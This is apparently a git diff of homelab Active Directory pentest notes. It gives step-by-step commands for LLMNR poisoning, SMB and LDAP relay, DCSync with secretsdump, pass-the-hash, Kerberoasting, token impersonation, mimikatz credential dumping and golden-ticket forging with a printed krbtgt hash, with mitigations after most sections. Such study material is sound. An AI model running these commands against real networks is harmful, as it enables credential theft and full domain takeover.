@@ -65,11 +65,14 @@ Link Local Multi-Cast Name Resolution, used to identify hosts when DNS fails to 
 -> Previously NBT-NS (NetBios Name Service)
 -> Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to 
 
-**Step 1 :** Run Responder on attacker via `responder -I eth0 -dwv (Listening)
-![](assets/llmnr1.png)`
+**Step 1 :** Run Responder on attacker via `responder -I eth0 -dwv (Listening)`
+
+![](assets/llmnr1.png)
+
 **Step 2 :** An event occurs... (Example : someone typed a wrong network drive, here we simulate it by trying to access //mistake)
 
 **Step 3 :** Get the hash
+
 ![](assets/llmnr2.png)
 
 **Step 4 :** Crack the hash using hashcat
@@ -88,6 +91,7 @@ Instead of cracking hashes gathered with Responder, we can instead relay those h
 Requirements : SMB signing must be disabled on the target ; Relayed user credentials must be admin on machine
 
 **Step 1:** `nano /usr/share/responder/Responder.conf` and turn off SMB and HTTP
+
 ![](assets/relay1.png)
 By default, Responder will happily answer SMB/HTTP requests itself.  
 But for an SMB relay attack, we want Responder to **collect and pass NTLM auth to ntlmrelayx** instead of grabbing hashes.
@@ -99,8 +103,11 @@ But for an SMB relay attack, we want Responder to **collect and pass NTLM auth t
 **Step 4 :** Event occurs on `.50` machine... (Example : victim tries to access a network share that doesn’t exist)
 
 **Step 5 :** Congrats, in this case we dumped local sam hashes including local client2 account hash
+
 ![](assets/relay2.png)
+
 to check if smb signing is disabled -> `nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24`
+
 ![](assets/signing1.png)
 
 **Mitigation?** 
@@ -121,27 +128,36 @@ to check if smb signing is disabled -> `nmap --script=smb2-security-mode.nse -p4
 **ATTACK FLOW:**
 
 **Step 1 :** Start ntlmrelayx via : `impacket-ntlmrelayx -6 -t ldaps://192.168.1.100 -wh fakewpad.homelab.local -l lootme`
+
 ![](assets/mitm1.png)
 
 **Step 2 :**   Start mitm6 via `mitm6 -d homelab.local
+
 ![](assets/mitm2.png)`
 
 **Step 3 :** An event occurs (trigger win10 machine rebooting), boom:
+
 ![](assets/mitm3.png)
 
 when checking lootme directory:
+
 ![](assets/mitm4.png)
+
 We get a bunch of files containing information that can help us through our pentest, take for example `domain_users_by_group.html` :
+
 ![](assets/mitm5.png)
+
 bingo someone thought it was a good idea to write their password down in the account description...
 
 Additionnally, if we get an Administrator to log in into a client, ntlmrelayx can create a user account that is in the Entreprise Admins group :
+
 ![](assets/mitm6.png)
 
 Next we will try to use `impacket-secretsdump` with the credentials of the newly created user as advised in the previous screenshot.
 It is a tool for dumping password hashes, Kerberos tickets, and LSA secrets from Windows systems either remotely over SMB or from extracted registry hives (SAM, SYSTEM, SECURITY). It supports cleartext credentials when available, NTLM hashes, and can be used with passwords or pass-the-hash for authentication. 
 
 Usage : `impacket-secretsdump homelab/eghOfpExwq:'cFW,(qQ@H7^u5PV'@DC01.homelab.local -just-dc`
+
 ![](assets/mitm7.png)
 ![](assets/mitm8.png)
 
@@ -152,7 +168,6 @@ Kerberos keys are also available, which allow Pass-the-Key attacks and forged ti
 The Administrator hash can be used for immediate remote code execution on the Domain Controller using Impacket tools like `psexec`, `wmiexec`, or `smbexec`.  
 
 At this stage, the domain is fully compromised, and we control authentication across the environment. This attack is called DCSync, it tricks a Domain Controller into thinking you are another DC, the DC then hands over credential material from the NTDS.dit.
-
 
 **Mitigation?**
 
@@ -166,9 +181,7 @@ If WPAD is not in use internally, disable it via Group Policy and by disabling t
 Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
 Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.
 
-
 **Passback Attacks :** https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
-
 ### Other attack vectors
 
 **Strategies for a pentest engagement :**
@@ -177,7 +190,6 @@ Run scans to generate traffic
 If scans are taking too long, look for websites in scope (try with metasploit `http_version`)
 Look for default credentials on web logins (Printers, Jenkins, etc)
 Think outside the box
-
 ### Post-Compromise Enumeration
 
 **PowerView :** https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
@@ -190,12 +202,15 @@ SharpHound is the component responsible for gathering information. It can be dep
 
 The typical workflow begins by getting SharpHound onto a Windows host within the domain :
 **Step 1 :** Bypass powershell execution policy : `powershell -ep bypass`
+
 ![](assets/blood1.png)
 
 **Step 2 :** Run either `.ps1` script or `.exe` file
 
 **Step 3 :** Run this command : `Invoke-BloodHound -CollectionMethod All -Domain homelab.local -OutputDirectory C:... -ZipFilename blood.zip`
+
 ![](assets/blood2.png)
+
 After execution, the zip file generated must be exfiltrated back to the attacker’s machine. The attacker then imports this file into the BloodHound GUI, which parses the data and builds a graph-based view of the environment. 
 
 This graph makes it easier to visualize complex AD relationships and to spot potential attack paths such as a regular user account having indirect membership that leads to administrative privileges or misconfigured ACLs that allow privilege abuse.
@@ -203,12 +218,15 @@ This graph makes it easier to visualize complex AD relationships and to spot pot
 Pre-made queries are helpful to map out the AD environment and help us gather more leads into our next steps. Some examples include :
 
 **All domain admins :**
+
 ![](assets/blood3.png)
 
 **Shortest path to domain admin :**
+
 ![](assets/blood4.png)
 
 **All kerberoastable users :**
+
 ![](assets/blood5.png)
 
 BloodHound is powerful because it automates the mapping of large, complicated AD structures. It helps attackers identify paths that are not obvious by manual inspection, such as chained group memberships or cross-domain trusts. 
@@ -218,24 +236,33 @@ All these attacks require some sort of credential to be effective.
 If we crack a password/or can dump SAM hashes, we can leverage both for lateral movement in the network.
 
 CrackMapExec is a post-exploitation tool used for assessing Active Directory networks. It allows attackers to automate credential validation, command execution, enumeration, and lateral movement across Windows systems. Often described as a Swiss army knife for pentesting AD.
+
 Pass The Password :  `crackmapexec smb <ip/CIDR> -u <user> -d  <domain> -p <pass>`
+
 ![](assets/crackmapexec1.png)
+
 We can also dump SAM hashes :
+
 ![](assets/crackmapexec2.png)
 
 Using `impacket-secretsdump` :
+
 ![](assets/secretsdump1.png)
 
 **Attempting to crack hashes using hashcat :** 
 `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
 Result (cracked 2 out of 3 hashes, first is empty pass):
+
 ![](assets/hashcat1.png)
 
 Pass The Hash :  `crackmapexec smb <ip/CIDR> -u <user>  -H <hash> --local-auth`
+
 ![](assets/crackmapexec3.png) 
+
 (Green plus sign / pwned  indicates good chance/successful attempt) 
 
 **Attempting to get a shell using psexec :** (proof of concept)
+
 ![](assets/psexec1.png)
 
 **Mitigation?**
@@ -262,20 +289,28 @@ Impersonate is non-interactive such as attaching a network drive or a domain log
 
 **Token impersonation with incognito :**
 **Step 1 :** Run meterpreter session
+
 ![](assets/meterpreter2.png)
 ![](assets/meterpreter1.png)
 
-**Step 2 :** load incognito![](assets/incognito1.png)
+**Step 2 :** load incognito
+
+![](assets/incognito1.png)
 
 **Step 3 :** List available tokens 
+
 ![](assets/incognito2.png)
 
 **Step 4 :** Impersonate Administration token
+
 ![](assets/incognito3.png)
 
 **Note :** you cannot run hashdump when impersonating administrator token, run `rev2self`
+
 ![](assets/incognito4.png)
-Works with other users tokens 
+
+Works with other users tokens :
+
 ![](assets/incognito5.png)
 
 **Mitigation?**
@@ -294,17 +329,18 @@ https://medium.com/@Shorty420/kerberoasting-9108477279cc
 ![](assets/kerber2.png)
 
 ![](assets/kerber3.png)
+
 Let's try it on our lab:
 `impacket-GetUserSPNs homelab.local/petep:password1$ -dc-ip 192.168.1.100 -request`
+
 ![](assets/kerber4.png)
+
 Then we can attempt to crack it using hashcat :
 `hashcat -m 13100 kerbhash.txt /usr/share/wordlists/rockyou.txt
 `
 **Mitigation?**
 -> Strong passwords
 -> Least privilege
-
-
 #### GPP (Group Policy Preferences - MS14-025) : 
 Group Policy Preferences allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a cPassword. The key was accidentally released. It was patched in MS14-025, but the patch does not prevent previous uses.
 
@@ -339,12 +375,15 @@ We start by launching mimikatz and typing `privilege::debug` , this is trying to
 **Some commands we can use :**
 
 `sekurlsa::logonpasswords` : extracts credential material from the LSASS process on a Windows machine by reading its memory space where authentication information is stored. When executed, it can reveal plaintext passwords (wdigest), NTLM hashes, Kerberos tickets, and other authentication tokens for all logged-in users on the system. This makes it one of the most powerful and commonly used functions in Mimikatz, since it directly provides the attacker with credentials that can be used for lateral movement, privilege escalation, or persistence within a network.
+
 ![](assets/mimi2.png)
 
 Attempt at trying to dump SAM :
+
 ![](assets/mimi3.png)
 
 Dumping LSA : Usernames and NTLM hashes
+
 ![](assets/mimi4.png)
 
 **Golden ticket attack  + pass the ticket:**
@@ -352,6 +391,7 @@ Dumping LSA : Usernames and NTLM hashes
 A golden ticket attack is a post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the secret key of the krbtgt account, which is the account that signs all TGTs in a domain. Once the attacker compromises a domain controller and extracts the krbtgt account’s NTLM hash, they can use tools like Mimikatz to generate golden tickets that allow them to impersonate any user, including domain admins, and access any service in the domain. These tickets can be customized to never expire or be reissued, giving the attacker long-term and stealthy persistence in the environment even if passwords are reset for other accounts, since the only true fix is to reset the krbtgt password twice across the domain to invalidate forged tickets.
 
 Executing this command:
+
 ![](assets/gt1.png)
 
 We have to write some info down
@@ -362,6 +402,7 @@ And using this command :
 `kerberos::golden /User:Administrator /domain:homelab.local /sid:S-1-5-21-833969855-242020450-2509043900 /krbtgt:4ecf7518f730dfc45fcad7fc679f53fa /id:500 /ptt`
 
 That command tells Mimikatz to forge and immediately inject (`/ptt` : pass the ticket) a golden ticket for the Administrator  in the domain. It uses the domain’s SID and the NTLM hash of the krbtgt account ) to sign the ticket. The `/id:500` specifies the RID for the Administrator account, ensuring the forged ticket has the correct identity. In short, this command creates a valid-looking Kerberos TGT for the domain Administrator and loads it into memory so the attacker can act as that account.
+
 ![](assets/gt2.png)
 
 Following that with `misc::cmd` spawns a new command shell that inherits this authentication context. The result is that the new cmd.exe can immediately access domain resources like file shares, servers, or even remote administration tools using the forged Administrator ticket, effectively giving you a working shell as a domain admin without needing the real password.
